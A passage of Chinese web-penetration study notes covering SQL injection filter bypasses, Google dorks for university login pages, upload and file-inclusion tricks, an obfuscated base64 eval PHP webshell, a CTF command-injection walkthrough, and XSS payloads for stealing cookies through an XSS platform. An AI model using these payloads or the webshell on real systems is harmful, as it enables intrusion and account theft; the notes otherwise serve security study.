</code></pre></div><h2 id="cnvd证书"><a href="#cnvd证书" class="header-anchor">#</a> CNVD证书</h2> <h4 id="事件型"><a href="#事件型" class="header-anchor">#</a> 事件型</h4> <ul><li><strong>必须是高危的  (重要机构)</strong></li> <li><strong>通用型</strong></li></ul> <h4 id="poc-漏洞检测工具"><a href="#poc-漏洞检测工具" class="header-anchor">#</a> POC : (漏洞检测工具)</h4> <h4 id="exp-漏洞的利用工具"><a href="#exp-漏洞的利用工具" class="header-anchor">#</a> EXP : (漏洞的利用工具)</h4> <h2 id="正则表达式"><a href="#正则表达式" class="header-anchor">#</a> 正则表达式</h2> <ul><li><strong>[-] 字符范围。匹配指定范围内的任意字符。如： '[a-z]' 可以匹配 'a' 到'z' 范围内的任意小写字母字符</strong>**</li> <li><strong><code>/</code> 表示正则表达式的开始，再一个<code>/</code> 表示结束</strong>、</li> <li><strong>在结束的<code>/</code>后面跟上的为定界符</strong></li> <li><strong><code>i</code> 表示在和模式进行匹配进不区分大小写</strong></li> <li><strong><code>S</code>  如果没有使用这个模式修正符号，元字符中的<code>&quot;.&quot;</code> 默认不能表示换行符号，将串视为单行</strong></li></ul> <h2 id="单引号逃逸"><a href="#单引号逃逸" class="header-anchor">#</a> <strong>单引号逃逸</strong></h2> <ul><li><strong>注释符被过滤</strong></li></ul> <div class="language-sql extra-class"><pre class="language-sql"><code><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">user</span> <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token string">'$id'</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span>，<span class="token number">1</span>

<span class="token number">1</span>’ <span class="token operator">and</span> <span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1'</span>
</code></pre></div><h4 id="其他用法"><a href="#其他用法" class="header-anchor">#</a> 其他用法</h4> <ul><li><strong>&amp;&amp; ： 在<code>url</code> 代表参数之间的一个分隔   (但是不能直接输入，要转成url码才可以使用)</strong> <code>%26</code></li></ul> <div class="language-sql extra-class"><pre class="language-sql"><code><span class="token operator">or</span> 和 <span class="token operator">and</span> 被过滤
<span class="token operator">||</span>     <span class="token operator">&amp;&amp;</span>
<span class="token operator">%</span><span class="token number">7</span>c    <span class="token operator">%</span><span class="token number">26</span>
</code></pre></div><h2 id="空格绕过"><a href="#空格绕过" class="header-anchor">#</a> 空格绕过</h2> <ul><li><strong>如果在尝试注入过程中，发现空格被空格过滤，那么就可以去尝试括号是否被过滤，如果括号未被过滤，那么就可以尝试括号来进行绕过。</strong></li> <li><strong>因为在mysql中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，多可以用括号包围起来。儿括号的两端可以没有多余的空格</strong></li> <li><strong><code>/**/</code> : 多行注释</strong></li></ul> <div class="language-sql extra-class"><pre class="language-sql"><code><span class="token comment"># 对字段、表名进行包裹，无法对关键字进行包裹</span>
<span class="token keyword">SELECT</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">and</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>

空格被过滤
<span class="token comment">/**/</span>
<span class="token keyword">select</span><span class="token comment">/**/</span><span class="token keyword">from</span>
<span class="token operator">%</span><span class="token number">09</span>
</code></pre></div><h2 id="大小绕过"><a href="#大小绕过" class="header-anchor">#</a> 大小绕过</h2> <ul><li><strong>在正则匹配中，<code>select</code> 和<code>union</code> 没有加上 <code>/i</code> 是区分大小写匹配的，那就可以通过大小写绕过，如Select 、Union</strong></li> <li><strong>因为这个正则将匹配的字符直接转为空的，那就可以通过双写绕过。如：selectselect , 当中间的 select 被匹配到就变成空了，那这个字符就变成select</strong></li></ul> <p>如：</p> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231011172034848.webp" alt="image-20231011172034848"></p> <h2 id="宽字节绕过"><a href="#宽字节绕过" class="header-anchor">#</a> 宽字节绕过</h2> <p>如 ：<code>id=1%df%27/**/order/**?by/**/3%20 --+</code></p> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231011172219239.webp" alt="image-20231011172219239"></p> <div class="language-sql extra-class"><pre class="language-sql"><code><span class="token operator">%</span>df<span class="token operator">%</span><span class="token number">26</span>  <span class="token comment">--&gt; gbk</span>
<span class="token string">'\''</span>

<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> user_id <span class="token operator">=</span> <span class="token string">'1 *'</span> <span class="token operator">and</span> <span class="token operator">*</span><span class="token string">''</span>
</code></pre></div><h2 id="逻辑缺陷"><a href="#逻辑缺陷" class="header-anchor">#</a> 逻辑缺陷</h2> <ul><li><p><strong>水平越权</strong></p></li> <li><p><strong>垂直越权  (低权限如果想要越权高权限 是需要一个接口来)</strong></p></li></ul> <div class="language-sql extra-class"><pre class="language-sql"><code>site:hunau<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token punctuation">.</span>intext:学号
<span class="token comment">//site:域名。</span>
返回域名中所有的URL地址，它可以探测网站的拓扑结构进行，也是非常的重要，使用非常频繁。比如搜索北京大学所有学院的URL地址，我们输入“学院 site:pku<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn”就可以搜索到它所有的学院
</code></pre></div><h2 id="使用谷歌语法进行搜索"><a href="#使用谷歌语法进行搜索" class="header-anchor">#</a> 使用谷歌语法进行搜索</h2> <ul><li><strong>在国内由于各种限制导致很多信息都无法直接获取，而谷歌搜索引擎又十分强大，使用独特的谷歌搜索引擎往往可以帮我们收集到一些意想不到的信息。</strong></li> <li><strong>谷歌搜索引擎在国内无法直接进行访问。但是谷歌也有在中国做有镜像网站，以下为谷歌镜像网站链接</strong></li></ul> <p><strong>1.<a href="https://s.iit.xyz/" target="_blank" rel="noopener noreferrer">s.iit.xyz<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></strong></p> <p><strong>2.<a href="https://note.cm/" target="_blank" rel="noopener noreferrer">note.cm<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></strong></p> <p><strong>3.<a href="https://www.google.com/" target="_blank" rel="noopener noreferrer">Google<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></strong></p> <h4 id="谷歌搜索语法命令"><a href="#谷歌搜索语法命令" class="header-anchor">#</a> <strong>谷歌搜索语法命令：</strong></h4> <ul><li><strong>inurl:.edu.cn 统一身份验证</strong></li></ul> <div class="language- extra-class"><pre class="language-text"><code>site:指定域名

filetype:指定文件类型

inurl:指定url

intitle:指定title元素内的内容搜索

intext:把网页正文中某个关键字做为搜索条件，然后搜索全世界网页正文中含有这些关键字的网页,allintext：关键字功能相同。

info:这个语法用于搜索指定站点的一些基本信息。比如搜索北京大学网站的一些信息
</code></pre></div><p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/20200428172116300.webp" alt="20200428172116300"></p> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/20200428172122181.webp" alt="20200428172122181"></p> <p><strong>如果想了解更多的语法就移步到<a href="https://blog.csdn.net/xxx0028/article/details/105818546" target="_blank" rel="noopener noreferrer">谷歌搜索引擎使用语法大全收集_谷歌语法怎么找cms-CSDN博客<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>这篇文章</strong></p> <h2 id="文件操作"><a href="#文件操作" class="header-anchor">#</a> 文件操作</h2> <h4 id="文件上传"><a href="#文件上传" class="header-anchor">#</a> 文件上传</h4> <ul><li><strong>php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门</strong></li> <li><strong>有时可以使用 <code>../</code> 来将文件上传到其他目录，达到一个利用的效果。</strong></li></ul> <div class="language- extra-class"><pre class="language-text"><code>1 : 服务器脚本语言为PHP
2 : 服务器使用CGI/ FastCGL 模式
3 : 上传目录下要有可执行的PHP文件
</code></pre></div><div class="language-php extra-class"><pre class="language-php"><code>eval : 执行代码函数
system : 执行外部程序，并且显示输出
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
</code></pre></div><h4 id="文件包含"><a href="#文件包含" class="header-anchor">#</a> 文件包含</h4> <ul><li><strong>如果是以文本的形式它会直接输出，如果是代码的形式就直接执行</strong></li> <li><strong>include  ：(语句包含并运行指定文件)</strong></li></ul> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231012180659200.webp" alt="image-20231012180659200"></p> <div class="language-php extra-class"><pre class="language-php"><code>//如果想看代码的内容就可以用相关的一个协议

php://filter/read=convert.base64-encode/resource=index.php
//php伪协议，以base64编码输出

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre></div><h2 id="rce漏洞-远程命令-代码执行"><a href="#rce漏洞-远程命令-代码执行" class="header-anchor">#</a> RCE漏洞（远程命令/代码执行）</h2> <ul><li><strong>system()</strong></li> <li><strong>passthru()</strong></li> <li><strong>exec()</strong></li> <li><strong>shell_exec()</strong></li> <li><strong>popen()</strong></li> <li><strong>proc_open()</strong></li> <li><strong>pcntl_exec()</strong></li></ul> <h4 id="web-混淆"><a href="#web-混淆" class="header-anchor">#</a> Web 混淆</h4> <div class="language-PHP extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>		<span class="token comment">//可以用动态传参 用变量的值来作为我们的变量名</span>
	<span class="token variable">$$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'y'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'z'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'b'</span><span class="token punctuation">;</span>
	<span class="token variable">$$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'eval'</span><span class="token punctuation">;</span>
	<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'eval'</span><span class="token punctuation">;</span>
	<span class="token variable">$eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre></div><h4 id="web-类混淆"><a href="#web-类混淆" class="header-anchor">#</a> Web 类混淆</h4> <div class="language-php extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">x</span>
<span class="token punctuation">{</span>
	<span class="token keyword">public</span> <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$decode_payload</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">_cocnstruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>			<span class="token comment">//初始化模式</span>
    <span class="token punctuation">{</span>		<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">payload</span><span class="token operator">=</span><span class="token string single-quoted-string">'ZXZhbCgkx1BPU1RbYV0pOw=='</span><span class="token punctuation">;</span>
     		<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">decode_payload</span> <span class="token operator">=</span> @<span class="token function">base64_decode</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">payload</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
     		@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;/*sasas23123*/&quot;</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">decode_payload</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;/*sdfw3123*/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
nwew <span class="token function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre></div><h3 id="url绕过"><a href="#url绕过" class="header-anchor">#</a> URl绕过</h3> <h4 id="先分析代码"><a href="#先分析代码" class="header-anchor">#</a> <strong>先分析代码</strong></h4> <ul><li><strong>源码中出现<code>eval($_GET[‘url’])</code>说明可以使用GET方式以 <code>url</code>为参进行传值。</strong> <strong><code>eval`函数可以将传入的代码当做命令执行；则传入`?url=system('ls /');</code></strong></li></ul> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231019112722999.webp" alt="image-20231019112722999"></p> <p><strong>查看根目录下的文件，发现一个<code>flllllaaaaaaggggggg`文件；再传入`?url=system(“cat /flllllaaaaaaggggggg”);</code>查看文件，文件中有flag。</strong></p> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231019113014675.webp" alt="image-20231019113014675"></p> <h4 id="linux-命令中的空格绕过"><a href="#linux-命令中的空格绕过" class="header-anchor">#</a> Linux 命令中的空格绕过</h4> <ul><li><strong>绕过空格过滤</strong>**</li></ul> <p><strong>1.<code>${IFS}</code>绕过</strong></p> <p><strong><code>$IFS{}</code>是shell的特殊环境变量,是Linux下的内部区域分隔符。$IFS中存储的值可以使空格、制表符、换行符或者其他自定义符号</strong>。**</p> <p><strong>2.<code>$IFS$9</code>绕过</strong></p> <div class="language- extra-class"><pre class="language-text"><code>?url=ls   ：把当前目录并列出来

?url=ls${IFS}/	:查看当前文件的根目录

tab 也是一个空格 ，它转义后是%09
</code></pre></div><p><strong>3.制表符绕过</strong></p> <ul><li><strong>tab :  %09是制表符的URL编码,可以通过%09来代替空格，绕过空格过滤</strong></li></ul> <h4 id="这里以ctfer中的一个靶场为例-swpuctf-2021-新生赛babyrce"><a href="#这里以ctfer中的一个靶场为例-swpuctf-2021-新生赛babyrce" class="header-anchor">#</a> <strong>这里以ctfer中的一个靶场为例：  <a href="http://node5.anna.nssctf.cn:28233/" target="_blank" rel="noopener noreferrer">SWPUCTF 2021 新生赛babyrce<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></strong></h4> <p><strong>题目描述：</strong></p> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231019103541823.webp" alt="image-20231019103541823"></p> <p><strong>点进去可以看到代码中的要求就是<code>cookie[admin]=1</code>，如果是将得到一个新的文件，如果不是则输出&quot;echo&quot;的内容</strong></p> <p><strong>打开bp抓包 在里面添加<code>cookie:admin=1</code></strong> <strong>放包</strong> <strong>，查看返回值</strong></p> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231019101702064.webp" alt=""></p> <p><strong>可以看到得到一个新的文件<code>rasalghul.php</code></strong></p> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231019104941119.webp" alt="image-20231019104941119"></p> <p><strong>将文件与url拼接起来，得到新的代码。代码提示我们GET要输入url</strong></p> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231019105414006.webp" alt="image-20231019105414006"></p> <p><strong>再仔细看可以发现是空格绕过， 是用户传入的<code>url</code>变量会被<code>shell_ecec</code>执行，通过前面的<code>url</code></strong></p> <p><strong>绕过 用``ls`命令来把当前目录列出来得到目录下的flag文件</strong></p> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231019105843861.webp" alt="image-20231019105843861"></p> <p><strong>再用<code>cat</code>命令来打开，就可以拿到flag了</strong></p> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231019110250455.webp" alt="image-20231019110250455"></p> <h4 id="在php中能执行系统命令的关键字"><a href="#在php中能执行系统命令的关键字" class="header-anchor">#</a> 在php中能执行系统命令的关键字</h4> <ul><li><strong>列如：<a href="http://node5.anna.nssctf.cn:28640/" target="_blank" rel="noopener noreferrer">这都不会，还想web入门？？？？<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></strong></li> <li><strong>先找出没有被过滤的 可以看到反引号没有被过滤</strong></li> <li><strong>函数?code=print(<code>l's'</code>);</strong></li> <li><strong>?code=print(<code>ca\\t /fffffffffflagafag</code>);</strong></li></ul> <p>​</p> <h2 id="xss-漏洞"><a href="#xss-漏洞" class="header-anchor">#</a> XSS 漏洞</h2> <ul><li><strong>XSS(前端代码注入)</strong></li> <li><strong>XSS(跨站脚本漏洞)</strong></li></ul> <h4 id="前端代码-开源-三块"><a href="#前端代码-开源-三块" class="header-anchor">#</a> 前端代码（开源）三块</h4> <ol><li><strong>HTML：网页的框架</strong></li> <li><strong>CSS：把网站变得更加好看</strong></li> <li><strong>Javascript：让网页功能更强大</strong></li></ol> <div class="language- extra-class"><pre class="language-text"><code>对于攻击者而言CSS并不重要，因为他只是美化界面，并没有安全效果

攻击的方向是js和如何触发js。因为js很强大，它可以控制浏览器
</code></pre></div><ul><li><strong><code>document.cookie=&quot;id&quot;</code>(设置浏览器Cookie的js代码)</strong></li> <li><strong>偷偷发送数据包(异步传输)</strong></li> <li><strong>它可以窃取Cookie (先读取你的Cookie然后偷偷发送数据包给黑客，黑客收到Cookie后就可以登录你的账户)</strong></li></ul> <div class="language- extra-class"><pre class="language-text"><code>拿到Cookie不等于拿到密码。（Cookie授权是有时效的）Cookie本身是不安全的，但是为了便捷并且利大于弊的情况下就选择了Cookie
</code></pre></div><p><strong>Js的标识：</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span> <span class="token comment">// 设置了一个js弹窗</span>

<span class="token operator">&lt;</span>a href<span class="token operator">=</span>javascript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&gt;</span> <span class="token comment">// 伪协议触发</span>

<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span><span class="token operator">&gt;</span> <span class="token comment">// 事件方法（触发器：事件在标签里面on开头的东西很高概率是事件）触发条件是src=1，因为这个本身不成立所以执行了后面的语句</span>
</code></pre></div><p><strong>在实战中不建议使用 <code>alert()</code> 这个函数进行弹窗，会影响业务正常运行属于风险操作</strong></p> <blockquote><p><strong>使用以下示例</strong></p></blockquote> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p><strong>上面三个不仅仅是js的标识还是触发的方法</strong></p> <p><a href="https://blog.csdn.net/qq_36354324/article/details/106592588" target="_blank" rel="noopener noreferrer">JavaScript事件触发手册(opens new window)<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <div class="language- extra-class"><pre class="language-text"><code>有的时候是缓存问题导致无法弹窗CTRL+F5就行了

事件功能非常强大，甚至可以监听键盘鼠标，左键右键，屏幕。
</code></pre></div><p><strong>弹出网站cookie</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span> <span class="token comment">// 设置了一个js弹窗</span>

<span class="token operator">&lt;</span>a href<span class="token operator">=</span>javascript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&gt;</span> <span class="token comment">// 伪协议触发</span>

<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span> <span class="token operator">/</span><span class="token operator">&gt;</span> <span class="token comment">// 事件方法（触发器：事件在标签里面on开头的东西很高概率是事件）触发条件是src=1，因为这个本身不成立所以执行了后面的语句</span>
</code></pre></div><h4 id="xss分为三种类型-反射型-、dom型-、存储型"><a href="#xss分为三种类型-反射型-、dom型-、存储型" class="header-anchor">#</a> XSS分为三种类型：反射型  、DOM型 、存储型</h4> <ul><li><strong>反射型：  反射型  （就是将我们输入的内容回显到当前页面）打印在控制台  。你给我传参，然后触发了Js，如果你不给我传参，就不存在(传参里必须包含恶意语句才是标准的反射性XSS语句)  测试：<code>&lt;scripts&gt;console.log(123)&lt;/script&gt;</code></strong></li> <li><strong>存储型：</strong> <strong>它是将我们写入的一个内容直接写在数据库里面存储下来的传参，不需要传参中必须有恶意语句。但这样的脚本会被存进数据库，在这之后的所有人在访问这个网站的时候都有可能会执行你写的xss脚本(只要他存储在目标服务器)</strong></li></ul> <ul><li><strong>存储型的xss脚本的功能是十分强大的，如果有人在网站的数据库里打入了一个存储型的xss脚本，并且它会获取每个用户的Cookie，那么他就会有盗号等一系列的风险</strong></li></ul> <h4 id="反射性的xss要点击才会中招"><a href="#反射性的xss要点击才会中招" class="header-anchor">#</a> 反射性的xss要点击才会中招</h4> <ul><li><strong><code>http://www.xxx.com/?a=&lt;script&gt;alert(1)&lt;/script&gt;</code>这就是一个反射性xss脚本，正常人看见都觉得肯定有问题，所以就可以引入一个东西</strong>**</li></ul> <div class="language- extra-class"><pre class="language-text"><code>叫做短链接，原理很简单，在百度随便一搜就大把多。可以把长链接压缩成短链接，这样就可以引导别人点击。

在实际网站中也会遇见尖括号被编码掉了导致无法注入

前端代码有一个很重要的东西是兼容性。会对一些东西进行包容
</code></pre></div><p><strong>JavaScript还支持一些编码例如：NATIVE</strong></p> <p><strong>弹窗函数被劫栏会尝试替代<code>prompt(1)</code></strong></p> <div class="language- extra-class"><pre class="language-text"><code>payload: 'onfocus=alert(1)autofocus' 当input输入框获取焦点时执行(onfocus)
</code></pre></div><h2 id="cookie同源策略"><a href="#cookie同源策略" class="header-anchor">#</a> <a href="https://joker123op.github.io/blog2/handbook/xss.html#cookie%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5" target="_blank" rel="noopener noreferrer">#<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>Cookie同源策略</h2> <p><strong>浏览器的同源策略，限制了不同源的JS，对当前页面的资源和属性的权限。同源策略保护了a.com域名下的资源不被来自其他网页的脚本读取或篡改</strong></p> <p>**所谓同源是：需要同域名/端口、**协议</p> <p><strong>比如 <code>http://www.baidu.com</code>    就不是同源的   Js偷Cookie就是读取本地的Cookie发送到我准备好的目标服务器上</strong></p> <div class="language- extra-class"><pre class="language-text"><code>https://www.baidu.com
</code></pre></div><h4 id="xss平台-opens-new-window-域名做越短越好"><a href="#xss平台-opens-new-window-域名做越短越好" class="header-anchor">#</a> <a href="https://xssaq.com/" target="_blank" rel="noopener noreferrer">XSS平台 (opens new window)<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>域名做越短越好</h4> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304181445728.webp" alt="Img"></p> <p><strong>如果只是窃取Cookie勾选这两个就已经够了</strong></p> <p><strong>给网站添加cookie或者更改的插件是<code>EditThisCookie</code>下载地址放这里了<a href="https://github.com/ETCExtensions/Edit-This-Cookie/releases/tag/1.5.0" target="_blank" rel="noopener noreferrer">跳转(opens new window)<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" 